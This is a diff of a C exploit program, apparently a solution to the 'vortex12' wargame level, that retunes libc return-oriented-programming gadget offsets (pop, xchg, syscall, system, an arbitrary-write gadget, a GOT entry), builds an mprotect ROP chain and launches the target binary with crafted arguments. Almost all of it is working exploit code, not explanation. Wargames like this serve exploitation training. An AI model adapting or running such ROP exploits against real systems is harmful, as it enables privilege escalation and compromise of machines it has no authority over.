@@ -20,32 +20,30 @@
 #define PATH_MAX 256
 
 
-#define LIBCBASE 0xf7c00000
-#define JMP_EAX_OFFSET 0x3d43cd
-#define SYSCALL_OFFSET 0x3c7570 
-#define POP_EBX_OFFSET 0x2a9f9
+#define LIBCBASE 0xf7c00000        //DONE
+#define JMP_EAX_OFFSET 0x218c7         //DONE
+#define SYSCALL_OFFSET 0x3c4540         //DONE
+#define POP_EBX_OFFSET 0x0002bf5f         //DONE
 #define ADD_ESP_POP_EBX_OFFSET 0x2a9f6
-#define POP_EDX_OFFSET 0x36425
-#define POP_EAX_OFFSET 0x12b3e5
-#define POP_ECX_POP_EDX_OFFSET 0x36424
+#define POP_EDX_OFFSET 0x000371c4         //DONE
+#define POP_EAX_OFFSET 0x0002ec6b        //DONE
+#define POP_ECX_POP_EDX_OFFSET 0x000371c3        //DONE
 #define PPP_CALL_OFFSET 0x82979
 #define POP_POP_POP_OFFSET 0x12b3e3 
 #define PUSH_EBP_OFFSET 0xb7c14 
+//0x000b5f35: push eax; push esi; call ebx; ... might not be a push ebp
 #define PUSH_EAX_PUSH_EBP_OFFSET 0xb7c13 
-#define ARB_WRITE_OFFSET 0x3a7c6
-#define GETS_OFFSET 0x710e0 
+#define ARB_WRITE_OFFSET 0x0004a7b6         //DONE
 #define AND_AL_OFFSET 0x1969a4 
-#define AND_EAX_7F_OFFSET 0x2ee58 
-#define AND_EDX_OFFSET 0xfebf6
-#define ADD_EDX_OFFSET 0xb54f3
-#define PRINTF_OFFSET 0x51e60
-#define SYSTEM_OFFSET 0x4a570
-#define EXEC_OFFSET 0xe0a20
-#define XCHG_EAX_EBP_OFFSET 0x0003545f
-#define XCHG_EAX_ESI_OFFSET 0x25b66 
-#define XCHG_EAX_EBX_OFFSET 0x199404 
-#define PRINTF_GOT_OFFSET 0x4010
-#define BIN_BASE 0x8048000
+#define AND_EAX_7F_OFFSET 0x0002fc88         //DONE
+#define AND_EDX_OFFSET 0x000fab56 
+#define ADD_EDX_OFFSET 0x000b3263         //DONE
+#define SYSTEM_OFFSET 0x47cb0        //DONE
+#define XCHG_EAX_EBP_OFFSET 0x0003545f        //DONE
+#define XCHG_EAX_ESI_OFFSET 0x0002c51e        //DONE
+#define XCHG_EAX_EBX_OFFSET 0x00099c6f        //DONE
+#define PRINTF_GOT_OFFSET 0x4010        //DONE
+#define BIN_BASE 0x8048000        //DONE
 #define SET_TO_SEVEN 0xffffff07
 #define SET_TO_F 0xffffff0f
 #define RODATA_LEN 0x4
@@ -135,7 +133,7 @@ int main(void) {
   PUT32(set_7f_arg, 0xffffff7d);
   
   char mprotect_addr[DWORD+1] = "";
-  PUT32(mprotect_addr, LIBCBASE+SYSCALL_OFFSET);
+  PUT32(mprotect_addr, LIBCBASE+MPROTECT_SYSCALL_OFFSET);
 
   uint rop_chain_size = (sizeof(FILL)+(READ_BUF_SIZE*2));
   char *mprotect_rop = (char *) malloc(sizeof(char)*rop_chain_size);
@@ -204,4 +202,5 @@ int main(void) {
   char *env[2] = {path_arg, 0};
   execve("./vortex12", argv, env);
 }
+
 
